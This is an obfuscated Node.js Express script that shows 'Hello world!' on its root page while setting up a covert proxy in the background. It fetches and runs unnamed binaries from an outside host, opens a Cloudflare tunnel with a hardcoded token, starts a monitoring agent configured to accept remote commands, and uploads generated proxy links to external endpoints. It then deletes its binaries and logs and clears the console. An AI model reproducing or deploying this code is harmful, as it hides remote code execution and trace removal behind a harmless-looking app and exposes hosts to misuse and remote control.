const _0x582c3b=_0x234b;function _0x234b(_0x3b3970,_0x574036){_0x3b3970=_0x3b3970-0x107;const _0x48c7e8=_0x48c7();let _0x234bcd=_0x48c7e8[_0x3b3970];return _0x234bcd;}function _0x48c7(){const _0x3af3bd=['/vmess-argo?ed=2560','--tls','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','log','block','argo.szj.de5.net','push','freedom','unshift','arm64','\x20>\x20nul\x202>&1','8443848KCcnne','/api/delete-nodes','stream','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','text/plain;\x20charset=utf-8','forEach','success','https://arm64.ssss.nyc.mn/bot','9c7bc6fe-df79-453e-bc6d-fc02f37fbc62','set','chmod','/trojan-argo','/sub.txt\x20saved\x20successfully','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','arm','http','UUID','Unhandled\x20error\x20in\x20startserver:','rm\x20-rf\x20','Skipping\x20adding\x20automatic\x20access\x20task','Content-Type','config.json','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0aclient_secret:\x20','&fp=firefox&type=ws&host=','\x20>/dev/null\x202>&1\x20&','countryCode','data','catch','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/v1','nohup\x20','CFPORT','\x20failed:\x20','response','UPLOAD_URL','2087','?security=tls&sni=','ARGO_AUTH','https://amd64.ssss.nyc.mn/web','8443','4989668HEngJZ','env','cdns.doon.eu.org','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','split','isFile','Error\x20reading\x20boot.log:','error','base64','platform','from','false','\x20already\x20exists','&path=%2Ftrojan-argo%3Fed%3D2560#','Nodes\x20uploaded\x20successfully','clear','Download\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','boot.log','charAt','Error\x20in\x20startserver:','close','TunnelSecret','application/json','org','aarch64','2053','56876qaFfAd','tls','\x20-c\x20\x22','subs','all','mkdirSync','/vless-argo','none','join','vless','/api/add-subscriptions','Subscription\x20uploaded\x20successfully','tcp','5931992qqrrci','exec','map','https://arm64.ssss.nyc.mn/v1','listen','\x0avless://','453153oxoWch','quic','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','sub.txt','win32','match','?encryption=none&security=tls&sni=','test','127.0.0.1','npm\x20running\x20error:\x20','xtls-rprx-vision','2083','\x20>/dev/null\x202>&1','\x20successfully','Empowerment\x20success\x20for\x20','message','amd','https://arm64.ssss.nyc.mn/web','http://ip-api.com/json/','https://arm64.ssss.nyc.mn/agent','basename','unlink','unlinkSync','http\x20server\x20is\x20running\x20on\x20port:','1523832eYtYHm','writeFileSync','vmess','toString','\x20is\x20created','PROJECT_URL','\x20-p\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20','App\x20is\x20running','filter','NEZHA\x20variable\x20is\x20empty,skip\x20running','send','has','then','tunnel.yml','https://ipapi.co/json/','tunnel.json','createWriteStream','/vmess-argo','stringify','util','NEZHA_SERVER','child_process','/config.json\x20>/dev/null\x202>&1\x20&','177cjFfEx','Unknown','3690000tNAKig','post','.exe\x20>\x20nul\x202>&1','&path=%2Fvless-argo%3Fed%3D2560#','SERVER_PORT','utf-8','fileName','54VswVds','argo','status','Hello\x20world!','\x20-s\x20','random','country_code','get','arch','/api/add-nodes','\x0a\x20\x20tunnel:\x20','includes','true','taskkill\x20/f\x20/im\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','./tmp','443','https://oooo.serv00.net/add-url','\x20is\x20running','Error\x20executing\x20command:\x20','web\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/agent','/dev/null','Add\x20automatic\x20access\x20task\x20faild:\x20','firefox','abcdefghijklmnopqrstuvwxyz','NEZHA_PORT','readFileSync','express','length','AUTO_ACCESS','existsSync'];_0x48c7=function(){return _0x3af3bd;};return _0x48c7();}(function(_0x1f0a55,_0x405f47){const _0x7f3e30=_0x234b,_0x50ef5d=_0x1f0a55();while(!![]){try{const _0x77047c=-parseInt(_0x7f3e30(0x1a6))/0x1+-parseInt(_0x7f3e30(0x193))/0x2*(parseInt(_0x7f3e30(0x117))/0x3)+-parseInt(_0x7f3e30(0x175))/0x4+parseInt(_0x7f3e30(0x119))/0x5+parseInt(_0x7f3e30(0x1be))/0x6+-parseInt(_0x7f3e30(0x14b))/0x7+parseInt(_0x7f3e30(0x1a0))/0x8*(parseInt(_0x7f3e30(0x120))/0x9);if(_0x77047c===_0x405f47)break;else _0x50ef5d['push'](_0x50ef5d['shift']());}catch(_0x2577ca){_0x50ef5d['push'](_0x50ef5d['shift']());}}}(_0x48c7,0xd10e2));const express=require(_0x582c3b(0x13c)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x582c3b(0x113)),exec=promisify(require(_0x582c3b(0x115))[_0x582c3b(0x1a1)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x582c3b(0x176)][_0x582c3b(0x16f)]||'',PROJECT_URL=process[_0x582c3b(0x176)][_0x582c3b(0x1c3)]||'',AUTO_ACCESS=process[_0x582c3b(0x176)][_0x582c3b(0x13e)]||![],FILE_PATH=process[_0x582c3b(0x176)]['FILE_PATH']||_0x582c3b(0x12f),SUB_PATH=process[_0x582c3b(0x176)]['SUB_PATH']||_0x582c3b(0x196),PORT=process[_0x582c3b(0x176)][_0x582c3b(0x11d)]||process['env']['PORT']||0xbb8,UUID=process[_0x582c3b(0x176)][_0x582c3b(0x15b)]||_0x582c3b(0x153),NEZHA_SERVER=process[_0x582c3b(0x176)][_0x582c3b(0x114)]||'',NEZHA_PORT=process[_0x582c3b(0x176)][_0x582c3b(0x13a)]||'',NEZHA_KEY=process[_0x582c3b(0x176)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x582c3b(0x145),ARGO_AUTH=process['env'][_0x582c3b(0x172)]||'eyJhIjoiNjkzY2QxZTRkNDQwZmQ5MzVlOTk1Y2M4NjkxY2VhZDEiLCJ0IjoiYzUwMzAyYTUtMDUyZi00OGY5LWFkYTQtNzdmOTMxMmZkY2NiIiwicyI6IlptVmtOamcwTVRJdFlUVmhPQzAwTXpreExXRXlNMll0TURJeU9XRmtZMkV3T1RBNCJ9',ARGO_PORT=process['env']['ARGO_PORT']||0x4651,CFIP=process[_0x582c3b(0x176)]['CFIP']||_0x582c3b(0x177),CFPORT=process[_0x582c3b(0x176)][_0x582c3b(0x16c)]||0x1bb,NAME=process[_0x582c3b(0x176)]['NAME']||_0x582c3b(0x121);!fs[_0x582c3b(0x13f)](FILE_PATH)?(fs[_0x582c3b(0x198)](FILE_PATH),console['log'](FILE_PATH+_0x582c3b(0x1c2))):console[_0x582c3b(0x143)](FILE_PATH+_0x582c3b(0x184));function generateRandomName(){const _0x372b2b=_0x582c3b,_0xa5cc6b=_0x372b2b(0x139);let _0x465513='';for(let _0x469314=0x0;_0x469314<0x6;_0x469314++){_0x465513+=_0xa5cc6b['charAt'](Math['floor'](Math[_0x372b2b(0x125)]()*_0xa5cc6b['length']));}return _0x465513;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x582c3b(0x19b)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x582c3b(0x19b)](FILE_PATH,botName),subPath=path[_0x582c3b(0x19b)](FILE_PATH,_0x582c3b(0x1a9)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x582c3b(0x19b)](FILE_PATH,_0x582c3b(0x18a)),configPath=path[_0x582c3b(0x19b)](FILE_PATH,'config.json');function deleteNodes(){const _0x156a34=_0x582c3b;try{if(!UPLOAD_URL)return;if(!fs[_0x156a34(0x13f)](subPath))return;let _0x4626c2;try{_0x4626c2=fs['readFileSync'](subPath,_0x156a34(0x11e));}catch{return null;}const _0x250cae=Buffer[_0x156a34(0x182)](_0x4626c2,_0x156a34(0x180))[_0x156a34(0x1c1)](_0x156a34(0x11e)),_0x532975=_0x250cae[_0x156a34(0x17c)]('\x0a')['filter'](_0x58c121=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x58c121));if(_0x532975[_0x156a34(0x13d)]===0x0)return;return axios['post'](UPLOAD_URL+_0x156a34(0x14c),JSON[_0x156a34(0x112)]({'nodes':_0x532975}),{'headers':{'Content-Type':_0x156a34(0x18f)}})[_0x156a34(0x168)](_0x191017=>{return null;}),null;}catch(_0x8704ab){return null;}}function cleanupOldFiles(){const _0x497fa2=_0x582c3b;try{const _0x5c6c4c=fs['readdirSync'](FILE_PATH);_0x5c6c4c[_0x497fa2(0x150)](_0x2ab0c2=>{const _0x5b1ade=_0x497fa2,_0x22a2a2=path[_0x5b1ade(0x19b)](FILE_PATH,_0x2ab0c2);try{const _0x262085=fs['statSync'](_0x22a2a2);_0x262085[_0x5b1ade(0x17d)]()&&fs[_0x5b1ade(0x1bc)](_0x22a2a2);}catch(_0x1f74cd){}});}catch(_0x2c768b){}}app['get']('/',function(_0x482a9e,_0x24f8c3){const _0x28a506=_0x582c3b;_0x24f8c3[_0x28a506(0x10a)](_0x28a506(0x123));});async function generateConfig(){const _0x1ad8b8=_0x582c3b,_0x447ea8={'log':{'access':_0x1ad8b8(0x136),'error':_0x1ad8b8(0x136),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x1ad8b8(0x1b0)}],'decryption':_0x1ad8b8(0x19a),'fallbacks':[{'dest':0xbb9},{'path':_0x1ad8b8(0x199),'dest':0xbba},{'path':_0x1ad8b8(0x111),'dest':0xbbb},{'path':_0x1ad8b8(0x156),'dest':0xbbc}]},'streamSettings':{'network':_0x1ad8b8(0x19f)}},{'port':0xbb9,'listen':_0x1ad8b8(0x1ae),'protocol':_0x1ad8b8(0x19c),'settings':{'clients':[{'id':UUID}],'decryption':_0x1ad8b8(0x19a)},'streamSettings':{'network':_0x1ad8b8(0x19f),'security':_0x1ad8b8(0x19a)}},{'port':0xbba,'listen':_0x1ad8b8(0x1ae),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1ad8b8(0x19a)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1ad8b8(0x15a),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x1ad8b8(0x1c0),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1ad8b8(0x111)}},'sniffing':{'enabled':!![],'destOverride':[_0x1ad8b8(0x15a),'tls',_0x1ad8b8(0x1a7)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1ad8b8(0x1ae),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1ad8b8(0x19a),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1ad8b8(0x15a),_0x1ad8b8(0x194),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x1ad8b8(0x147),'tag':'direct'},{'protocol':'blackhole','tag':_0x1ad8b8(0x144)}]};fs[_0x1ad8b8(0x1bf)](path[_0x1ad8b8(0x19b)](FILE_PATH,_0x1ad8b8(0x160)),JSON[_0x1ad8b8(0x112)](_0x447ea8,null,0x2));}function getSystemArchitecture(){const _0x569194=_0x582c3b,_0x45f12b=os[_0x569194(0x128)]();return _0x45f12b===_0x569194(0x159)||_0x45f12b===_0x569194(0x149)||_0x45f12b===_0x569194(0x191)?'arm':_0x569194(0x1b6);}function downloadFile(_0x3fddf2,_0x545c86,_0x1e902d){const _0x416fba=_0x582c3b,_0x27f277=_0x3fddf2;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x4972a4=fs[_0x416fba(0x110)](_0x27f277);axios({'method':_0x416fba(0x127),'url':_0x545c86,'responseType':_0x416fba(0x14d)})[_0x416fba(0x10c)](_0x564a3c=>{const _0x162e91=_0x416fba;_0x564a3c[_0x162e91(0x167)]['pipe'](_0x4972a4),_0x4972a4['on']('finish',()=>{const _0x50fa50=_0x162e91;_0x4972a4[_0x50fa50(0x18d)](),console[_0x50fa50(0x143)]('Download\x20'+path['basename'](_0x27f277)+_0x50fa50(0x1b3)),_0x1e902d(null,_0x27f277);}),_0x4972a4['on'](_0x162e91(0x17f),_0x2df940=>{const _0x1e034d=_0x162e91;fs[_0x1e034d(0x1bb)](_0x27f277,()=>{});const _0x22b5bc=_0x1e034d(0x188)+path[_0x1e034d(0x1ba)](_0x27f277)+'\x20failed:\x20'+_0x2df940[_0x1e034d(0x1b5)];console[_0x1e034d(0x17f)](_0x22b5bc),_0x1e902d(_0x22b5bc);});})[_0x416fba(0x168)](_0x325e8b=>{const _0x174a78=_0x416fba,_0x2575f2=_0x174a78(0x188)+path[_0x174a78(0x1ba)](_0x27f277)+_0x174a78(0x16d)+_0x325e8b['message'];console['error'](_0x2575f2),_0x1e902d(_0x2575f2);});}async function downloadFilesAndRun(){const _0x469da6=_0x582c3b,_0x24d6dd=getSystemArchitecture(),_0x4d9327=getFilesForArchitecture(_0x24d6dd);if(_0x4d9327[_0x469da6(0x13d)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x14ca00=_0x4d9327[_0x469da6(0x1a2)](_0x468104=>{return new Promise((_0x1857bd,_0x1fbebf)=>{const _0x4ffba0=_0x234b;downloadFile(_0x468104[_0x4ffba0(0x11f)],_0x468104['fileUrl'],(_0x31e1e2,_0x6eca9f)=>{_0x31e1e2?_0x1fbebf(_0x31e1e2):_0x1857bd(_0x6eca9f);});});});try{await Promise[_0x469da6(0x197)](_0x14ca00);}catch(_0x1734f5){console[_0x469da6(0x17f)]('Error\x20downloading\x20files:',_0x1734f5);return;}function _0x5bd379(_0x53bac8){const _0x152351=0x1fd;_0x53bac8['forEach'](_0x51006f=>{const _0x474af5=_0x234b;fs[_0x474af5(0x13f)](_0x51006f)&&fs[_0x474af5(0x155)](_0x51006f,_0x152351,_0x18dd47=>{const _0x242051=_0x474af5;_0x18dd47?console[_0x242051(0x17f)]('Empowerment\x20failed\x20for\x20'+_0x51006f+':\x20'+_0x18dd47):console[_0x242051(0x143)](_0x242051(0x1b4)+_0x51006f+':\x20'+_0x152351[_0x242051(0x1c1)](0x8));});});}const _0x55898e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5bd379(_0x55898e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x12931a=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x399e8d=new Set([_0x469da6(0x130),_0x469da6(0x174),'2096',_0x469da6(0x170),_0x469da6(0x1b1),_0x469da6(0x192)]),_0x525ed9=_0x399e8d[_0x469da6(0x10b)](_0x12931a)?_0x469da6(0x12c):_0x469da6(0x183),_0x4d94b7=_0x469da6(0x163)+NEZHA_KEY+_0x469da6(0x158)+NEZHA_SERVER+_0x469da6(0x179)+_0x525ed9+_0x469da6(0x142)+UUID;fs[_0x469da6(0x1bf)](path[_0x469da6(0x19b)](FILE_PATH,'config.yaml'),_0x4d94b7);const _0x3db617=_0x469da6(0x16b)+phpPath+_0x469da6(0x195)+FILE_PATH+_0x469da6(0x1c5);try{await exec(_0x3db617),console[_0x469da6(0x143)](phpName+'\x20is\x20running'),await new Promise(_0x1fca46=>setTimeout(_0x1fca46,0x3e8));}catch(_0x1c2b1a){console[_0x469da6(0x17f)]('php\x20running\x20error:\x20'+_0x1c2b1a);}}else{let _0x2da84b='';const _0x491b14=[_0x469da6(0x130),_0x469da6(0x174),'2096',_0x469da6(0x170),'2083',_0x469da6(0x192)];_0x491b14[_0x469da6(0x12b)](NEZHA_PORT)&&(_0x2da84b=_0x469da6(0x141));const _0x411a1d=_0x469da6(0x16b)+npmPath+_0x469da6(0x124)+NEZHA_SERVER+':'+NEZHA_PORT+_0x469da6(0x1c4)+NEZHA_KEY+'\x20'+_0x2da84b+_0x469da6(0x169);try{await exec(_0x411a1d),console[_0x469da6(0x143)](npmName+_0x469da6(0x132)),await new Promise(_0xe9fc63=>setTimeout(_0xe9fc63,0x3e8));}catch(_0x41418b){console[_0x469da6(0x17f)](_0x469da6(0x1af)+_0x41418b);}}}else console['log'](_0x469da6(0x109));const _0x7bb75='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x469da6(0x116);try{await exec(_0x7bb75),console[_0x469da6(0x143)](webName+_0x469da6(0x132)),await new Promise(_0x2e9f9f=>setTimeout(_0x2e9f9f,0x3e8));}catch(_0x417eb1){console[_0x469da6(0x17f)](_0x469da6(0x134)+_0x417eb1);}if(fs[_0x469da6(0x13f)](botPath)){let _0x2a68ef;if(ARGO_AUTH[_0x469da6(0x1ab)](/^[A-Z0-9a-z=]{120,250}$/))_0x2a68ef=_0x469da6(0x17a)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x2a68ef=_0x469da6(0x161)+FILE_PATH+'/tunnel.yml\x20run':_0x2a68ef=_0x469da6(0x189)+FILE_PATH+_0x469da6(0x178)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2a68ef+_0x469da6(0x165)),console['log'](botName+'\x20is\x20running'),await new Promise(_0xfc5486=>setTimeout(_0xfc5486,0x7d0));}catch(_0x294718){console[_0x469da6(0x17f)](_0x469da6(0x133)+_0x294718);}}await new Promise(_0x599a59=>setTimeout(_0x599a59,0x1388));}function getFilesForArchitecture(_0x1e8ec2){const _0x3db302=_0x582c3b;let _0x108bc2;_0x1e8ec2===_0x3db302(0x159)?_0x108bc2=[{'fileName':webPath,'fileUrl':_0x3db302(0x1b7)},{'fileName':botPath,'fileUrl':_0x3db302(0x152)}]:_0x108bc2=[{'fileName':webPath,'fileUrl':_0x3db302(0x173)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x219756=_0x1e8ec2===_0x3db302(0x159)?_0x3db302(0x1b9):_0x3db302(0x135);_0x108bc2[_0x3db302(0x148)]({'fileName':npmPath,'fileUrl':_0x219756});}else{const _0x4aa00a=_0x1e8ec2===_0x3db302(0x159)?_0x3db302(0x1a3):_0x3db302(0x16a);_0x108bc2['unshift']({'fileName':phpPath,'fileUrl':_0x4aa00a});}}return _0x108bc2;}function argoType(){const _0x3727a1=_0x582c3b;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x3727a1(0x12e));return;}if(ARGO_AUTH['includes'](_0x3727a1(0x18e))){fs[_0x3727a1(0x1bf)](path[_0x3727a1(0x19b)](FILE_PATH,_0x3727a1(0x10f)),ARGO_AUTH);const _0x57e040=_0x3727a1(0x12a)+ARGO_AUTH[_0x3727a1(0x17c)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x3727a1(0x19b)](FILE_PATH,_0x3727a1(0x10f))+_0x3727a1(0x162)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x3727a1(0x1bf)](path[_0x3727a1(0x19b)](FILE_PATH,_0x3727a1(0x10d)),_0x57e040);}else console[_0x3727a1(0x143)](_0x3727a1(0x1a8));}async function extractDomains(){const _0x499ee3=_0x582c3b;let _0xc4ae2;if(ARGO_AUTH&&ARGO_DOMAIN)_0xc4ae2=ARGO_DOMAIN,console[_0x499ee3(0x143)]('ARGO_DOMAIN:',_0xc4ae2),await _0xa03619(_0xc4ae2);else try{const _0x155831=fs['readFileSync'](path[_0x499ee3(0x19b)](FILE_PATH,_0x499ee3(0x18a)),'utf-8'),_0x2a60af=_0x155831[_0x499ee3(0x17c)]('\x0a'),_0x5aebae=[];_0x2a60af[_0x499ee3(0x150)](_0x318410=>{const _0x528285=_0x499ee3,_0x134813=_0x318410[_0x528285(0x1ab)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x134813){const _0x33c2de=_0x134813[0x1];_0x5aebae[_0x528285(0x146)](_0x33c2de);}});if(_0x5aebae[_0x499ee3(0x13d)]>0x0)_0xc4ae2=_0x5aebae[0x0],console['log']('ArgoDomain:',_0xc4ae2),await _0xa03619(_0xc4ae2);else{console[_0x499ee3(0x143)](_0x499ee3(0x14e)),fs['unlinkSync'](path[_0x499ee3(0x19b)](FILE_PATH,'boot.log'));async function _0x486bb1(){const _0x1bd8d6=_0x499ee3;try{process['platform']===_0x1bd8d6(0x1aa)?await exec(_0x1bd8d6(0x12d)+botName+_0x1bd8d6(0x11b)):await exec('pkill\x20-f\x20\x22['+botName[_0x1bd8d6(0x18b)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x9d52a9){}}_0x486bb1(),await new Promise(_0x364e47=>setTimeout(_0x364e47,0xbb8));const _0x9d257b=_0x499ee3(0x189)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x499ee3(0x16b)+botPath+'\x20'+_0x9d257b+_0x499ee3(0x165)),console[_0x499ee3(0x143)](botName+_0x499ee3(0x132)),await new Promise(_0x11c8ca=>setTimeout(_0x11c8ca,0xbb8)),await extractDomains();}catch(_0x246cb5){console[_0x499ee3(0x17f)](_0x499ee3(0x133)+_0x246cb5);}}}catch(_0x25784e){console[_0x499ee3(0x17f)](_0x499ee3(0x17e),_0x25784e);}async function _0x57e568(){const _0x511e23=_0x499ee3;try{const _0xf578c8=await axios['get'](_0x511e23(0x10e),{'timeout':0xbb8});if(_0xf578c8[_0x511e23(0x167)]&&_0xf578c8['data'][_0x511e23(0x126)]&&_0xf578c8['data'][_0x511e23(0x190)])return _0xf578c8[_0x511e23(0x167)][_0x511e23(0x126)]+'_'+_0xf578c8['data'][_0x511e23(0x190)];}catch(_0x3f9bf9){try{const _0x2801e4=await axios[_0x511e23(0x127)](_0x511e23(0x1b8),{'timeout':0xbb8});if(_0x2801e4[_0x511e23(0x167)]&&_0x2801e4[_0x511e23(0x167)][_0x511e23(0x122)]===_0x511e23(0x151)&&_0x2801e4[_0x511e23(0x167)][_0x511e23(0x166)]&&_0x2801e4[_0x511e23(0x167)]['org'])return _0x2801e4[_0x511e23(0x167)]['countryCode']+'_'+_0x2801e4[_0x511e23(0x167)][_0x511e23(0x190)];}catch(_0xc85887){}}return _0x511e23(0x118);}async function _0xa03619(_0x1dab56){const _0xbfd5a5=await _0x57e568(),_0x2d37cb=NAME?NAME+'-'+_0xbfd5a5:_0xbfd5a5;return new Promise(_0x269425=>{setTimeout(()=>{const _0xe3b7a5=_0x234b,_0x3371b4={'v':'2','ps':''+_0x2d37cb,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xe3b7a5(0x19a),'net':'ws','type':_0xe3b7a5(0x19a),'host':_0x1dab56,'path':_0xe3b7a5(0x140),'tls':_0xe3b7a5(0x194),'sni':_0x1dab56,'alpn':'','fp':_0xe3b7a5(0x138)},_0x53d771=_0xe3b7a5(0x1a5)+UUID+'@'+CFIP+':'+CFPORT+_0xe3b7a5(0x1ac)+_0x1dab56+_0xe3b7a5(0x164)+_0x1dab56+_0xe3b7a5(0x11c)+_0x2d37cb+'\x0a\x0avmess://'+Buffer['from'](JSON[_0xe3b7a5(0x112)](_0x3371b4))[_0xe3b7a5(0x1c1)](_0xe3b7a5(0x180))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0xe3b7a5(0x171)+_0x1dab56+_0xe3b7a5(0x164)+_0x1dab56+_0xe3b7a5(0x185)+_0x2d37cb+_0xe3b7a5(0x1c6);console[_0xe3b7a5(0x143)](Buffer[_0xe3b7a5(0x182)](_0x53d771)[_0xe3b7a5(0x1c1)](_0xe3b7a5(0x180))),fs[_0xe3b7a5(0x1bf)](subPath,Buffer['from'](_0x53d771)['toString']('base64')),console[_0xe3b7a5(0x143)](FILE_PATH+_0xe3b7a5(0x157)),uploadNodes(),app[_0xe3b7a5(0x127)]('/'+SUB_PATH,(_0x498ca7,_0x34a1ad)=>{const _0x1cc6ea=_0xe3b7a5,_0x292819=Buffer[_0x1cc6ea(0x182)](_0x53d771)[_0x1cc6ea(0x1c1)](_0x1cc6ea(0x180));_0x34a1ad[_0x1cc6ea(0x154)](_0x1cc6ea(0x15f),_0x1cc6ea(0x14f)),_0x34a1ad[_0x1cc6ea(0x10a)](_0x292819);}),_0x269425(_0x53d771);},0x7d0);});}}async function uploadNodes(){const _0x2b5d22=_0x582c3b;if(UPLOAD_URL&&PROJECT_URL){const _0x2b381e=PROJECT_URL+'/'+SUB_PATH,_0x2ca69c={'subscription':[_0x2b381e]};try{const _0x52188f=await axios['post'](UPLOAD_URL+_0x2b5d22(0x19d),_0x2ca69c,{'headers':{'Content-Type':_0x2b5d22(0x18f)}});return _0x52188f&&_0x52188f[_0x2b5d22(0x122)]===0xc8?(console[_0x2b5d22(0x143)](_0x2b5d22(0x19e)),_0x52188f):null;}catch(_0x5bfaf7){if(_0x5bfaf7[_0x2b5d22(0x16e)]){if(_0x5bfaf7[_0x2b5d22(0x16e)][_0x2b5d22(0x122)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2b5d22(0x13f)](listPath))return;const _0x440e7f=fs[_0x2b5d22(0x13b)](listPath,_0x2b5d22(0x11e)),_0x583c23=_0x440e7f[_0x2b5d22(0x17c)]('\x0a')[_0x2b5d22(0x108)](_0x485e6f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2b5d22(0x1ad)](_0x485e6f));if(_0x583c23[_0x2b5d22(0x13d)]===0x0)return;const _0x591ded=JSON[_0x2b5d22(0x112)]({'nodes':_0x583c23});try{const _0x4ee341=await axios[_0x2b5d22(0x11a)](UPLOAD_URL+_0x2b5d22(0x129),_0x591ded,{'headers':{'Content-Type':_0x2b5d22(0x18f)}});return _0x4ee341&&_0x4ee341[_0x2b5d22(0x122)]===0xc8?(console[_0x2b5d22(0x143)](_0x2b5d22(0x186)),_0x4ee341):null;}catch(_0x35250b){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x1cec35=_0x234b,_0x454c53=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x454c53[_0x1cec35(0x146)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x454c53[_0x1cec35(0x146)](phpPath);process[_0x1cec35(0x181)]===_0x1cec35(0x1aa)?exec('del\x20/f\x20/q\x20'+_0x454c53['join']('\x20')+_0x1cec35(0x14a),_0x2a245a=>{const _0x5bfe36=_0x1cec35;console[_0x5bfe36(0x187)](),console[_0x5bfe36(0x143)](_0x5bfe36(0x107)),console[_0x5bfe36(0x143)](_0x5bfe36(0x17b));}):exec(_0x1cec35(0x15d)+_0x454c53[_0x1cec35(0x19b)]('\x20')+_0x1cec35(0x1b2),_0xfe7564=>{const _0xebe0da=_0x1cec35;console[_0xebe0da(0x187)](),console[_0xebe0da(0x143)]('App\x20is\x20running'),console[_0xebe0da(0x143)](_0xebe0da(0x17b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0xb380ed=_0x582c3b;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0xb380ed(0x15e));return;}try{const _0x3c7b87=await axios[_0xb380ed(0x11a)](_0xb380ed(0x131),{'url':PROJECT_URL},{'headers':{'Content-Type':_0xb380ed(0x18f)}});return console[_0xb380ed(0x143)]('automatic\x20access\x20task\x20added\x20successfully'),_0x3c7b87;}catch(_0x289e50){return console[_0xb380ed(0x17f)](_0xb380ed(0x137)+_0x289e50[_0xb380ed(0x1b5)]),null;}}async function startserver(){const _0x19f10e=_0x582c3b;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4a2670){console['error'](_0x19f10e(0x18c),_0x4a2670);}}startserver()[_0x582c3b(0x168)](_0x2a4999=>{const _0x49f5fc=_0x582c3b;console['error'](_0x49f5fc(0x15c),_0x2a4999);}),app[_0x582c3b(0x1a4)](PORT,()=>console[_0x582c3b(0x143)](_0x582c3b(0x1bd)+PORT+'!'));
